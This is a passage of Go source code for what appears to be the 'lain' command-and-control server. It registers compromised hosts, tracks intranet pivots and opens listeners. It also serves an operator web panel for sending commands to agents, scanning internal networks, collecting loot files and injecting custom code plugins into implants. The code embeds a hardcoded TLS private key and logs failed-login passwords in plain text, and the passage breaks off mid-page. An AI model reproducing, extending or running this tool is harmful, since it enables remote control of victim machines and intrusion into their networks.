    IP           string   `json:"ip"`
    Target       string   `json:"target"`
    ShellInnet   []string `json:"shell_innet"`
}

type DataInnet struct {
    Innets []Innet `json:"innets"`
}


var data_innet DataInnet

func put_innet(uid, target string, shell_innet []string) {
    var IP string
    for _, client := range client_data.Clients {
        if uid == client.Uid {
            IP = client.ExternalIP
            break
        }
    }
    // 查找是否已有匹配的 Innet
    found := false
    for i := range data_innet.Innets {
        if uid == data_innet.Innets[i].Uid && target == data_innet.Innets[i].Target {
            found = true
            for _, v := range shell_innet { // 遍历新传入的 shell_innet 列表
                replaced := false
                for index, existing := range data_innet.Innets[i].ShellInnet {
                    if strings.HasPrefix(existing, v) {
                        // 直接修改原始数据
                        data_innet.Innets[i].ShellInnet[index] = v
                        replaced = true
                        break
                    }
                }
                // 如果没有找到以 v 开头的项，则追加
                if !replaced {
                    data_innet.Innets[i].ShellInnet = append(data_innet.Innets[i].ShellInnet, v)
                }
            }
            return
        }
    }
    // 如果没有找到，追加新的 Innet
    if !found {
        newInnet := Innet{
            Uid:        uid,
            IP:         IP,
            Target:     target,
            ShellInnet: shell_innet, // 直接赋值传入的 shell_innet 列表
        }
        data_innet.Innets = append(data_innet.Innets, newInnet)
    }
}


// 辅助函数：检查切片中是否包含某个字符串
func contains(slice []string, item string) bool {
    for _, v := range slice {
        if v == item {
            return true
        }
    }
    return false
}

//写入链接结构体
func put_conn(username, host, online_time,uid,shell_ip,host_key string){
	newConn := getConn{
        Username:   username,
        Host:       host,
        OnlineTime: online_time,
		HostKey:    host_key,
        ShellIP:    shell_ip,
		Uid:		uid,
    }
	for _,conn := range data_conn.Conns{
		if username == conn.Username && uid == conn.Uid{
			return
		}
	}
    data_conn.Conns = append(data_conn.Conns, newConn)
	log_str := fmt.Sprintf("%v Request from user:%v,IP:%v,Host:%v,uid:%v",online_time, username, shell_ip, host,uid)
	logger.WriteLog(log_str)
}

type MyServer struct{}
func (s *MyServer) PutServer(
port, path, connPath, msgPath,switch_key,encry_key,download,result,net,info,upload,list,option,protocol, username, remark string,
    certPEM, keyPEM,uid,hostname,keyPart,filekey string, clients int,
) bool {
    // 检查是否已有相同的服务器配置（端口和协议相同）
    for _, server := range server_data.Servers {
        if server.Port == port && server.Protocol == protocol {
            log.Printf("Server with port %v and protocol %v already exists.\n", port, protocol)
            return false
        }
    }
    if remark == "" {
        remark = port + protocol
    }
    newServer := Server{
        Port:     port,
        Path:     path,
        ConnPath: connPath,
        MsgPath:  msgPath,
        SwitchPath: switch_key,
        EncryPath: encry_key,
        DownloadPath: download,
        ResultPath: result,
        NetPath: net,
        InfoPath: info,
        UploadPath: upload,
        ListPath: list,
        OptionPath: option,
        Protocol: protocol,
        CertPath: certPEM,
        KeyPath:  keyPEM,
        Clients:  clients,
        User: username,
        Remark:   remark,
        Uid:     uid,
        Hostname: hostname,
        KeyPart:  keyPart,
        Filekey:  filekey,
    }

    server_data.Servers = append(server_data.Servers, newServer)
    return true
}



// 写入主机结构体
func put_client(username, host, osType, online_time, shell_ip,currentDir,version,innet_ip,Remarks,uid,server_remark string, _delay int) {
    newClient := Client{
        Username:   username,
        Host:       host,
        OS:         osType,
        Delay:       _delay,
        OnlineTime: online_time,
        ExternalIP:    shell_ip,
		LocalIP:    innet_ip,
		CurrentDir: currentDir,
		version:    version,
		Remarks:    Remarks,
		Uid:         uid,
        Server: server_remark,
    }
	for i,client := range client_data.Clients{
		if username == client.Username && host == client.Host && uid == client.Uid{
			client_data.Clients[i].OnlineTime = online_time
			client_data.Clients[i].ExternalIP = shell_ip
			client_data.Clients[i].LocalIP = innet_ip
			client_data.Clients[i].Delay = _delay
			client_data.Clients[i].CurrentDir = currentDir
			client_data.Clients[i].version = version
			client_data.Clients[i].Remarks = Remarks
			client_data.Clients[i].checkTime = online_time
            client_data.Clients[i].Server = server_remark
			return
		}
	}
    client_data.Clients = append(client_data.Clients, newClient)
}

//获取主机结构体
func get_struct[T any](file_json string) ([]T, error) {
	// 打开 JSON 文件
	file, err := os.Open(file_json)
	if err != nil {
		return nil, fmt.Errorf("could not open file: %v", err)
	}
	defer file.Close()

	// 读取文件内容
	byteValue, err := ioutil.ReadAll(file)
	if err != nil {
		return nil, fmt.Errorf("Failed to read file content: %v", err)
	}

	// 检查类型 T 并根据文件结构解析 JSON 数据
	switch any(*new(T)).(type) {
	case User:
		var data Data_user
		err = json.Unmarshal(byteValue, &data)
		if err != nil {
			return nil, fmt.Errorf("Failed to parse JSON data: %v", err)
		}
		result := make([]T, len(data.Users))
		for i, v := range data.Users {
			result[i] = any(v).(T)
		}
		return result, nil
	case Client:
		var data Data
		err = json.Unmarshal(byteValue, &data)
		if err != nil {
			return nil, fmt.Errorf("Failed to parse JSON data: %v", err)
		}
		result := make([]T, len(data.Clients))
		for i, v := range data.Clients {
			result[i] = any(v).(T)
		}
		return result, nil
	case getConn:
		var data Data_conn
		err = json.Unmarshal(byteValue, &data)
		if err != nil {
			return nil, fmt.Errorf("Failed to parse JSON data: %v", err)
		}
		result := make([]T, len(data.Conns))
		for i, v := range data.Conns {
			result[i] = any(v).(T)
		}
		return result, nil
	default:
		return nil, fmt.Errorf("Unsupported types: %T", *new(T))
	}
}

//读取结构体
func readJSONFile(fileName string, v interface{}) error {
    file, err := os.OpenFile(fileName, os.O_RDWR|os.O_CREATE, 0644)
    if err != nil {
        return fmt.Errorf("could not open file: %v", err)
    }
    defer file.Close()

    byteValue, err := ioutil.ReadAll(file)
    if err != nil {
        return fmt.Errorf("Failed to read file content: %v", err)
    }

    if len(byteValue) > 0 {
        err = json.Unmarshal(byteValue, v)
        if err != nil {
            return fmt.Errorf("Failed to parse JSON data: %v", err)
        }
    }

    return nil
}

//写入结构体
func writeJSONFile(fileName string, v interface{}) error {
    updatedByteValue, err := json.MarshalIndent(v, "", "    ")
    if err != nil {
        return fmt.Errorf("JSON Serialization failed: %v", err)
    }

    err = ioutil.WriteFile(fileName, updatedByteValue, 0644)
    if err != nil {
        return fmt.Errorf("Writing back to file failed: %v", err)
    }

    return nil
}

/*结构体数据部分结束*/


// 预定义的默认证书和私钥（硬编码）
const defaultCert = `-----BEGIN CERTIFICATE-----
MIIDUTCCAjmgAwIBAgIUWx+LBRe2XIDAod8XpYH2JoyjuhYwDQYJKoZIhvcNAQEF
BQAwNTESMBAGA1UEAwwJMTI3LjAuMC4xMRIwEAYDVQQKDAkxMjcuMC4wLjExCzAJ
BgNVBAYTAkhLMB4XDTI0MDYzMDE2NTAwMFoXDTI0MDcxOTA2MDAwMFowcTELMAkG
A1UEBhMCS0gxEjAQBgNVBAgMCTEyNy4wLjAuMTESMBAGA1UEBwwJMTI3LjAuMC4x
MRIwEAYDVQQKDAkxMjcuMC4wLjExEjAQBgNVBAsMCTEyNy4wLjAuMTESMBAGA1UE
AwwJMTI3LjAuMC4xMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0WJS
cHsNxNiICwnTu4swyVas1V47NFN+yS90TJx8synK47GH2vywusxJYR4KtOG1+ARW
qQSw85ZQ9sG9b/pjeXuyI8QECccVcy+IWPHgv11zv6O7dfr2q8Jvkla6klSlozB2
8ClLEpJpIi+GA14FAngOMKhfQ15GIAXfmhTjEg13pTBkm0dKzTMfIDUE7Wkm1FAH
yDqioSko1+aqajpLS4/+U2mNLVmeK+fvnxumK9PWpE9IrSSEIIekVff1wi6geyOJ
MJjy6+MHSkArA0Xlm2ZMr91WTVA7KRWZn3B9c+b7L1gvgyD+9J7W2nDDvOD8hsCi
ClonNnxG6ZNybCJ4rQIDAQABox0wGzALBgNVHREEBDACggAwDAYDVR0TAQH/BAIw
ADANBgkqhkiG9w0BAQUFAAOCAQEAuiIrcHNb3bOllEmwIGmTDd3LONkff2IfkIfF
6y3dtw3YCGThppYOi+TyM3yCwIVhO/PRWqjD9OK+3eyhDA3ws+GlCdUHHKwq7eaR
ZqISUJGZb2dweJtJlK58MQcw2XT6o0XRmi7d+BcSprl25X0qJ5Zm7aOr1rgqs+e9
NtuR3TFIsCcvbP95e78yOfMGgc4HPcoXU1Dm+9ChuZTRbL/N9M6lM8TESqri/Rci
oj5MRRVicjuMshrEAOebOSABB/sQzGx6qD50ebxvtBWL76TFZgl8W/+9m6U69RGV
mwFmyhj9ezM5PHIPlQTY8Epyt33S4vo8dG2u+hN7uOx637Jc8A==
-----END CERTIFICATE-----`

const defaultKey = `-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDRYlJwew3E2IgL
CdO7izDJVqzVXjs0U37JL3RMnHyzKcrjsYfa/LC6zElhHgq04bX4BFapBLDzllD2
wb1v+mN5e7IjxAQJxxVzL4hY8eC/XXO/o7t1+varwm+SVrqSVKWjMHbwKUsSkmki
L4YDXgUCeA4wqF9DXkYgBd+aFOMSDXelMGSbR0rNMx8gNQTtaSbUUAfIOqKhKSjX
5qpqOktLj/5TaY0tWZ4r5++fG6Yr09akT0itJIQgh6RV9/XCLqB7I4kwmPLr4wdK
QCsDReWbZkyv3VZNUDspFZmfcH1z5vsvWC+DIP70ntbacMO84PyGwKIKWic2fEbp
k3JsInitAgMBAAECggEBAJH4wtJp51J5RnazlinkQtHKnFlwBURYhUZK0ABtBD5/
f1O3u6e+jJLdwrZzFDHAPXU3yRayD47yF2W/8Yp0fA8AXlOy3sHWSizwUVT4459l
zkEnK5R3rqpVtiTGU/GaE5OuQOzzTMQY0DSl/v6v+DwdaH8hkrBLtAW1MoqfzyIQ
gEf0Kw5E6WJ8Xr5sGzPPUkZohPwhnLVDssKWWxsKl4ajMKh2XWKEzjY+++9ansni
IVqQG1Em3sWJe6G0xl8FmRhJZZa+h9+lbOCBdpggZlX+Et+E4VilV7UL/VqYscMj
P2EUZ0DcfLbBOiygPSDOCgkJmZDRyKMMWw+Os/oRDeECgYEA80aEUs3/t7bISrea
Y62nqBhzg1FsTQn3akzEEnTWRcf+9tVXpIMGZi2VBGhcJg8z6L636e4Vmb105Xi8
w1T6OSpu+A3jdnrsGeqZt4yDqiQQu+Zgz0KhAr5R2F+JGcX2gbDBDRRMLFZiWNJW
DqoNH9ElLSzqyggfA6yomjp1trUCgYEA3FX++/EVZSgf3VR0xCglpPWuUVOZLypN
KP7EAPg40vYj6bEHrx3WZmXlZk0EavIy0Z02pmtyoPYyrqog8i691IPDfRqM1ncc
By0heNyq/PBgLbiPlCwl3TDY3XgaSTHNeYgpY+0TgziI5vTEBe0Pz4OAMxw6HA03
ZuKnGwvAvRkCgYBYwxn0vITZGy/pUyRZyjqp8oHzH/pMAZ7sgiXoNgkYXOiCV0Ur
GUN0dJ0yhoFYwaNHAI9KIzxuY9oLAAqfmpnR0dG7YBXmXONYcWi0t+gyZAZXCK+5
762fuqFSOUlkxf4zQ7KsewNwCfTIQ7Zyk0lGmqDd4s2n+V6XkJ/T5hCdIQKBgAvM
GvP4a5HX/STHodzi3Wkgsm2uUTRiSnFYerwmjjxVa4TWsregnFstN4QruYHUZ/4r
McLlW+TcachKWas973ISgAQRyNqu0/RaaUFkZ09Vu4CXMjDX0Eswk1wAUz/6B6tr
K/QqvHG5NDNRhbFfiQouW03hRAc+eenrVtEu5un5AoGBAO1QJWVxAoow7/fFcDpF
bYFbWeqQ73i5FK+1b1OZ41gDZsW++HRNx98DNBhNsdgXVbBsjmY3DfrcFDbyMacd
MumxXRIRd2XCtoVubxw2fl453fO+y4K1CZwHi3wrUSrfpP7J1rM7NA7mg6uSJHIT
Wfsk2JnY8xZGSSCLPIqNBOe9
-----END PRIVATE KEY-----`


func main(){
		asciiArt := `
						..                .
					x .d88'                @88>
		....		5888R                 %8P      u. u@88u.
					'888R         u      88u     x@88k u@88c.
			.....	888R      us888u.   .@88u  ^'8888''8888'
					888R   .@88 '8888' ''888E'   8888  888R
					888R   9888  9888    888E    8888  888R  ........
					888R   9888  9888    888E    8888  888R
					888R   9888  9888    888E    8888  888R
					.888B . 9888  9888    888&   '*88*' 8888'            ......
					^*888%  '888*''888'   R888'    ''   'Y'      ......          .....  ...₵Ø₦₦Ɇ₵₮ ɆVɆⱤ₮Ⱨł₦₲...
					'%     ^Y'   ^Y'     ''                      
            source code from : https://github.com/Mazzy-Stars/lain_c2
                    `
		// 查询用户结构体
		user_err := readJSONFile("user.json", &data_user)
		if user_err != nil {
			fmt.Println("Failed to read user data")
		}

		var index_port string
		var certPath string
		var keyPath string
		var useDefaultCert bool
		var css_file string

		// 读取命令行参数
		flag.StringVar(&index_port, "p", "443", "Port")
		flag.StringVar(&certPath, "cert", "", "Customize public key path")
		flag.StringVar(&keyPath, "key", "", "Customize private key path")
		flag.BoolVar(&useDefaultCert, "DefaultCert", false, "Use default public and private keys")
		flag.StringVar(&error_str, "resp-error", "error", "web error resp")
		flag.StringVar(&css_file, "css","", "Use default css file")
        flag.StringVar(&web_title, "title","lain", "web ui title")
		flag.Parse()
		if _, err := os.Stat("./html"); os.IsNotExist(err) {
			err := os.MkdirAll("./html", os.ModePerm)
			if err != nil {
				fmt.Println("[*] Unable to create directory ./html:", err)
				return
			}
			fmt.Println("[*] directory ./html Created successfully")
		}
		fs := http.FileServer(http.Dir("./html"))
		http.Handle("/", fs)
		fmt.Println(asciiArt)
		//登录
		http.HandleFunc("/login", func(w http.ResponseWriter, r *http.Request) {
			login().ServeHTTP(w, r)
		})
		//cmd前端
		http.HandleFunc("/cmdHtml", func(w http.ResponseWriter, r *http.Request) {
			cmd_html().ServeHTTP(w, r)
		})
		//页面
		http.HandleFunc("/lain", func(w http.ResponseWriter, r *http.Request) {
			lain().ServeHTTP(w, r)
		})
		//文件前端
		http.HandleFunc("/fileHtml", func(w http.ResponseWriter, r *http.Request) {
			file_html().ServeHTTP(w, r)
		})
        //msg前端
        http.HandleFunc("/msgHtml", func(w http.ResponseWriter, r *http.Request) {
            msgHtml().ServeHTTP(w, r)
        })
        //插件前端
        http.HandleFunc("/pluginHtml", func(w http.ResponseWriter, r *http.Request) {
            pluginHtml().ServeHTTP(w, r)
        })
		//有权限交互
		http.HandleFunc("/user_index", func(w http.ResponseWriter, r *http.Request) {
			User_index().ServeHTTP(w, r)
		})
		//调用js
		http.HandleFunc("/lain.js", func(w http.ResponseWriter, r *http.Request) {
			lain_js().ServeHTTP(w, r)
		})
		//调用css
		http.HandleFunc("/lain.css", func(w http.ResponseWriter, r *http.Request) {
			lain_css(css_file).ServeHTTP(w, r)
		})
        var cert tls.Certificate
	    var err error
		if useDefaultCert || (certPath == "" && keyPath == "") {
			cert, err = tls.X509KeyPair([]byte(defaultCert), []byte(defaultKey))
			if err != nil {
				fmt.Printf("Failed to load default certificate: %v\n", err)
				return
			}
		} else if certPath != "" && keyPath != "" {
			cert, err = tls.LoadX509KeyPair(certPath, keyPath)
			if err != nil {
				fmt.Printf("[*] Failed to load custom certificate: %v\n", err)
				return
			}
		} else {
			flag.Usage()
			return
		}
		// 自定义 TLS 配置
		tlsConfig := &tls.Config{
			MinVersion:       tls.VersionTLS12,
			GetCertificate:   func(chi *tls.ClientHelloInfo) (*tls.Certificate, error) { return &cert, nil },
			ClientAuth:       tls.NoClientCert,
			InsecureSkipVerify: true,
		}

		// 创建 HTTPS Server
		server := &http.Server{
			Addr:         ":" + index_port,
			Handler:      http.DefaultServeMux,
			IdleTimeout:  0,
			ReadTimeout:  30 * time.Second,
			WriteTimeout: 30 * time.Second,
			TLSConfig:    tlsConfig,
		}
		fmt.Printf("[*] Start server successful, access address https://localhost:%s/login\n", index_port)
		err = server.ListenAndServeTLS("", "")
		if err != nil {
			fmt.Printf("FAIL TO START %v\n", err)
		}
}

func generateRandomString(length int) string {
	bytes := make([]byte, length)
	_, err := rand.Read(bytes)
	if err != nil {
		log.Fatal(err)
	}
	return hex.EncodeToString(bytes)
}
/*登录*/
func login() http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if r.Method == http.MethodGet {
			html := fmt.Sprintf(`<!DOCTYPE html>
			<html lang="en">
			<head>
				<meta charset="UTF-8">
				<meta name="viewport" content="width=device-width, initial-scale=1.0">
				<title>%s</title>
				<link rel="stylesheet" href="/lain.css">
			</head>
			<body>
				<form class="form-in" action="/login" method="post" enctype="application/x-www-form-urlencoded">  
					<h1>Login</h1>
					<input type="text" name="username" id="username" placeholder="Username" required>
					<input type="password" name="password" placeholder="password" required>
					<button type="submit">Login</button>
				</form>
			</body>
			</html>`,web_title)
			w.Header().Set("Content-Type", "text/html")
			fmt.Fprint(w, html)
			return
		}
		if r.Method == http.MethodPost {
			// 解析表单数据
			err := r.ParseForm()
			if err != nil {
				fmt.Fprint(w, error_str)
				return
			}

			username := r.FormValue("username")
			password := r.FormValue("password")
            userip := getClientIP(r)

            hash:=md5.New()
            hash.Write([]byte(password))
            hashBytes := hash.Sum(nil)
            hashString := hex.EncodeToString(hashBytes)

			user_err := readJSONFile("user.json", &data_user)
			if user_err != nil {
				fmt.Fprint(w, error_str)
				return
			}
			var validUser bool
			for _, user := range data_user.Users {
				if username == user.Username && hashString[:24] == user.Password[:24]{
                    validUser = true
                    break
				}
			}
			current := time.Now()
			formattedTime := current.Format("2006.01.02 15:04")

			if validUser {
				// 设置Cookie
                randomValue := generateRandomString(32)
                cookie_value := randomValue+"="+username
				cookie := http.Cookie{
                    Name:     "cookie",
                    Value:    cookie_value,
                    Path:     "/",
                    Expires:  time.Now().Add(6 * 30 * 24 * time.Hour), // 半年
                    Secure:   true, 
                    SameSite: http.SameSiteLaxMode, 
                }                
                sessionSlice = append(sessionSlice,cookie_value)
				log_str := fmt.Sprintf("%v User login successful, come from %v User:%v", formattedTime, userip, username)
				logger.WriteLog(log_str)
				http.SetCookie(w, &cookie)
				http.Redirect(w, r, "/lain", http.StatusFound)
			} else {
				// 没有用户则
				log_str := fmt.Sprintf("%v  User login fail,come from %v Incorrect username or password, User:%v,pass:%v", formattedTime, userip, username,password)
				logger.WriteLog(log_str)
                fmt.Fprint(w, error_str)
			}
		} else {
			fmt.Fprint(w,error_str)
		}
	}
}

//lain
func lain() http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		//必须先登录
		usernameCookie, err := r.Cookie("cookie") // 使用 "cookie" 作为 Cookie 名称
        if err != nil {
            fmt.Fprint(w, error_str)
            return
        }
        // 标记是否找到用户
        var foundUser bool
        // 查找用户是否存在于 sessionSlice 中
        for _, session := range sessionSlice {
            if session == usernameCookie.Value {
                foundUser = true
                break
            }
        }
        // 如果没有找到用户，返回错误
        if !foundUser {
            fmt.Fprint(w,error_str)
            return
        }
		if r.Method == http.MethodGet {
			html := fmt.Sprintf(`
            <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>%s</title>
    <link rel="stylesheet" href="/lain.css">
	<link rel="icon" href="favicon.ico" type="image/x-icon">
</head>
<body>
    <script src="/lain.js"></script>
    <div class="container">
        <div class="sidebar">
            <p class='sidebar-title'>lain c&c</p>
            <a href="#" data-target="server">
                🎛️ server
            </a>
			<a href="#" data-target="index">
				📶 Listeners
			</a>
			<a href="#" data-target="userIndex">
                💬 Agents
			</a>
			<a href="#" data-target="net">
                🔗 intranet
			</a>
			<a href="#" data-target="file">
				📂 Files
			</a>
		</div>
        <div class="content">
            <button class="toggle-button" onclick="toggleSidebar()"></button>
            <button id="tel-toggleBtn" class="tel-toggleBtn">list</button>
            <div class="tle-sidebar" id="tle-sidebar">
                <a href="#" data-target="server">🎛️ server</a>
                <a href="#" data-target="index">📶 Listeners</a>
                <a href="#" data-target="userIndex">💬 Agents</a>
                <a href="#" data-target="net">🔗 intranet</a>
                <a href="#" data-target="file">📂 Files</a>
            </div>
            <div id="server" class="hidden">
                <div class="net_scan">
                    <button class="startBtn" type="button" onclick="openStartServerDialog()">start</button>
                    <button class="clearMemoryBtn" type="button" onclick="clearMemory()">ClearMemory</button>
                </div>
                <div id="server_index"></div>
                <script>
                    function openStartServerDialog() {
                        if (document.getElementById("serverDialog")) {
                            const dialog = document.getElementById("serverDialog");
                            dialog.style.display = "block";
                            requestAnimationFrame(() => {
                                dialog.style.transform = "translateX(-50%) scaleY(1)";
                                dialog.style.opacity = "1";
                            });
                            return;
                        }

                        var dialog = document.createElement("div");
                        dialog.id = "serverDialog";
                        dialog.className = "serverDialog";
                        dialog.style.display = "block";

                        var formHtml = '' +
                            '<h3>start server</h3>' +
                            '<form id="serverForm" method="POST">' +
                                '<input name="port" placeholder="Port" required><br>' +
                                '<input name="path" placeholder="Path" required><br>' +
                                '<input name="connPath" placeholder="Conn Path"><br>' +
                                '<input name="msgPath" placeholder="Msg Path"><br>' +
                                '<input name="switch_key" placeholder="switch path"><br>' +
                                '<input name="encry_key" placeholder="Key path"><br>' +
                                '<input name="download" placeholder="Download path"><br>' +
                                '<input name="result" placeholder="Result path"><br>' +
                                '<input name="net" placeholder="Net path"><br>' +
                                '<input name="info" placeholder="Info path"><br>' +
                                '<input name="upload" placeholder="Upload path"><br>' +
                                '<input name="list" placeholder="List path"><br>' +
                                '<input name="remark" placeholder="Remark"><br>' +
                                '<select id="protocol" name="protocol">' +
                                    '<option value="">select</option>' +
                                    '<option value="http">HTTP</option>' +
                                    '<option value="https">HTTPS</option>' +
                                '</select><br>' +
                                //参数自定义
                                '<input name="option" placeholder="parameter Option"><br>' +
                                '<input name="uid" placeholder="parameter uid"><br>' +
                                '<input name="user" placeholder="parameter user"><br>' +
                                '<input name="hostname" placeholder="parameter hostname"><br>' +
                                '<input name="keyPart" placeholder="parameter keyPart"><br>' +
                                '<input name="filekey" placeholder="parameter filekey"><br>' +
                                '<textarea name="cert" placeholder="Cert Content"></textarea><br>' +
                                '<textarea name="key" placeholder="Key Content"></textarea><br>' +
                                '<button type="button" id="submitBtn" onclick="startServer()">send</button>' +
                                '<button type="button" onclick="closeStartServerDialog()">close</button>' +
                            '</form>';

                        dialog.innerHTML = formHtml;
                        var container = document.getElementById("server_index");
                        container.appendChild(dialog);

                        dialog.style.transform = "translateX(-50%) scaleY(0)";
                        dialog.style.opacity = "0";
                        requestAnimationFrame(function () {
                            dialog.style.transform = "translateX(-50%) scaleY(1)";
                            dialog.style.opacity = "1";
                        });
                    }
                    
                    function plugin(remark) {
                        if (!remark || remark.trim() === "") {
                            alert("Please enter a remark for the plugin!");
                            return;
                        }

                        const form = document.getElementById('pluginForm');
                        const os = document.getElementById('select_os')?.value;
                        if (!os) {
                            alert("Please select an OS!");
                            return;
                        }

                        const codeWordInput = form.querySelector('input[name="codeWord"]');
                        const codeInput = form.querySelector('input[name="code"]');
                        const parameterDecInput = document.getElementById('parameterDec');
                        const paramCountInput = form.querySelector('#parameterHidden');

                        if (!codeWordInput || !codeInput || !parameterDecInput || !paramCountInput) {
                            alert("Missing required plugin form fields!");
                            return;
                        }

                        var codeWord = codeWordInput.value.trim();
                        var code = codeInput.value.trim();
                        var parameterDec = parameterDecInput.value.trim();
                        var paramCount = parseInt(paramCountInput.value);

                        if (codeWord === "" || code === "" || isNaN(paramCount) || paramCount < 1) {
                            alert("Please complete all plugin fields (codeWord, code, and at least 1 parameter)!");
                            return;
                        }
                        // 处理 parameterDec 为数组（允许空项）
                        var parameterDecArray = parameterDec.split(',').map(function(p) {
                            return p.trim();
                        });
                        while (parameterDecArray.length < paramCount) {
                            parameterDecArray.push("null");
                        }
                        parameterDec = parameterDecArray.join(',');
                        // 生成 msg1, msg2, ...
                        var codeParts = [];
                        for (var i = 1; i <= paramCount; i++) {
                            codeParts.push('msg' + i);
                        }

                        // 生成函数参数列表：msg1 string, msg2 string ...
                        var funcParams = codeParts.map(function(p) {
                            return p + ' string';
                        }).join(', ');

                        // 生成调用参数：msg[1], msg[2] ...
                        var callParams = codeParts.map(function(_, idx) {
                            return 'msg[' + (idx + 1) + ']';
                        }).join(', ');

                        // 替换 msg-1、msg-2 形式为 msg1、msg2
                        for (var i = 1; i <= paramCount; i++) {
                            var regex = new RegExp('msg-' + i, 'g');
                            code = code.replace(regex, 'msg' + i);
                        }

                        // 构造最终代码
                        var finalCode = 'case "' + codeWord + '":\n    go func(' + funcParams + ') {' + code + '}(' + callParams + ')';

                        // 构造 payload
                        var payload = {
                            remark: remark,
                            codeWords: codeWord,
                            parameter: codeParts.join(','),
                            parameterDesc: parameterDec,
                            code: finalCode,
                            os: os
                        };
                        console.log(payload);

                        console.log("[DEBUG] Sending payload:", payload);

                        // 发送到服务端
                        fetch('/user_index?op=insertPlugin', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(payload)
                        })
                        .then(function(response) {
                            if (!response.ok) {
                                return response.text().then(function(text) {
                                    throw new Error(text);
                                });
                            }
                            return response.text();
                        })
                        .then(function(data) {
                            alert('[✔] Plugin success: ' + data);
                            form.reset();

                            var dialog = document.getElementById("serverDialog");
                            if (dialog) {
                                dialog.style.transform = "translateX(-50%) scaleY(0)";
                                dialog.style.opacity = "0";
                                setTimeout(function() {
                                    dialog.style.display = "none";
                                }, 300);
                            }
                        })
                        .catch(function(error) {
                            console.error('[✘] Plugin fail: ' + error.message);
                            alert('[✘] 插件提交失败：' + error.message);
                        });
                    }

                    function closeStartServerDialog() {
                        var dialog = document.getElementById("serverDialog");
                        if (dialog) {
                            dialog.style.transform = "translateX(-50%) scaleY(0)";
                            dialog.style.opacity = "0";
                            setTimeout(function () {
                                dialog.parentNode.removeChild(dialog);
                            }, 300);
                        }
                    }
                    const server = new lain_server();
                    server.get_server();
                    server.checkTime();
                    function startServer(){
                        server.start_server();
                    }
                    function clearMemory() {
                        server.clear_memory();
                    }
                </script>
            </div>
            <div id="index" class="hidden">
                    <p id='div_conn'></p>
                    <script>
                        const l_index = new index();
                        l_index.lainShell();
                        shell_list = [];
                        function get_conn(uid, shellname) {
                            if (shell_list.includes(uid)) {
                                let ms = confirm("just a sec……");
                                if (ms) {
                                    setTimeout(() => {
                                        l_index.get(uid, shellname);
                                    }, 60000);
                                }
                                return;
                            }
                            l_index.get(uid, shellname);
                            shell_list.push(uid);
                        }
                        function del_conn(uid) {
                            l_index.del(uid);
                        }                    
                    </script>
            </div>
            <div id="userIndex" class="hidden">
            <div class="form">
                <input type="text" id="cmd_value" placeholder="group Commnad">
                <label for='options'>platform:</label>
                <select id='options' name='options'>
                    <option value=''>select</option>
                    <option value='win'>Windows</option>
                    <option value='linux'>Linux</option>
                    <option value='macos'>MacOs</option>
                    <option value='android'>Android</option>
                </select>
                <button type="button" onclick="getAll()">Send</button>
            </div>
                    <p id='div_index'></p>
                    <script>
                        const _index = new lain_index();
                        _index.lain_shell()
                        _index.checkTime()
                        function get(shell){
                            _index.get(shell)
                        }
                        function del(shell){
                            _index.del(shell)
                        }
                        function switchVer(shell,ver){
                            _index.switchVer(shell,ver)
                        }   
                        function getAll(){
                            let shell = document.getElementById('cmd_value').value;
                            let options = document.getElementById('options').value;
                            _index.getAll(options,shell)
                        }
                        function remarks(shell){
                            _index.remarks(shell)
                        }
                        function rate(shell){
                            _index.rate(shell)
                        }
                        function saveInfo(uid){
                            _index.saveInfo(uid)
                        }
                    </script>
            </div>
            <div id="net" class="hidden">
                <div class="net_scan">
                    <select name="net_shell" id="net_shell">
                        <option value="">Select</option>
                    </select>
					<div id="net_uid"></div>
                    <div id="have_ip"></div>
                </div>
                <div class="net_scan">
                    <select id='net_options' name='net_options'>
                        <option value=''>option</option>
                        <option value='scan'>Scan port</option>
                        <option value='sniff'>Scan host</option>
                    </select>
                    <input type="text" id="net_target" placeholder="Target">
                    <input type="text" id="net_target_list" placeholder="[range(1,20,45...)or(1-65534)]">
                    <select name="sleep_time" id="net_sleep_time" onchange="checkCustomOption(this)">
                        <option value="">Select scanning delay time</option>
                        <option value="1">1</option>
                        <option value="2">2</option>
                        <option value="3">3</option>
                        <option value="4">4</option>
                        <option value="5">5</option>
                        <option value="custom">customize</option>
                    </select>
                    <input type="text" id="custom_sleep_time" placeholder="Enter custom time" style="display:none;" />
                    <button onclick="net_send()">Send</button>
                </div>
                <div id="net_div" class="net_div"></div>
                <script>
                    const net = new lain_net();
                    net.getNet();
                    function checkCustomOption(select) {
                        var customInput = document.getElementById('custom_sleep_time');
                        if(select.value === 'custom') {
                            customInput.style.display = 'inline';
                            customInput.focus();
                        } else {
                            customInput.style.display = 'none';
                        }
                    }
                    function net_send(){
                        net.scan()
                    }
                    const selectElement = document.getElementById('net_shell');
                    selectElement.addEventListener('change', function() {
                        net.getshellip();
                    });
                </script>
            </div>
            <div id="file" class="hidden">
                <div id="g_file"></div>
                <script>
                    const loot = new lain_index();
                    function Get_loot(){
                        loot.getloot();
                    }
                    Get_loot()
                </script>
            </div>        
        </div>
    </div>
    <div id="log" class="log">
        <div class="resize-handle"></div>
        <div id="log-content">
        </div>
    </div>
    <div id="iframePanel" class="iframe-panel">
        <div class="drag-handle"></div>
        <button class="close-button" onclick="closeIframe()">x</button>
        <iframe id="iframe" src=""></iframe>
    </div>
    <script src="/lain.js"></script>
</body>
</html>
            `,web_title)
			w.Header().Set("Content-Type", "text/html")
			fmt.Fprint(w, html)
			return
		}
	}
}

//file-html
func file_html() http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		//必须先登录
		usernameCookie, err := r.Cookie("cookie") // 使用 "cookie" 作为 Cookie 名称
        if err != nil {
            fmt.Fprint(w, error_str)
            return
        }
        // 标记是否找到用户
        var foundUser bool
        // 查找用户是否存在于 sessionSlice 中
        for _, session := range sessionSlice {
            if session == usernameCookie.Value {
                foundUser = true
                break
            }
        }
        // 如果没有找到用户，返回错误
        if !foundUser {
            fmt.Fprint(w, error_str)
            return
        }
		if r.Method == http.MethodGet {
			html := `<!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
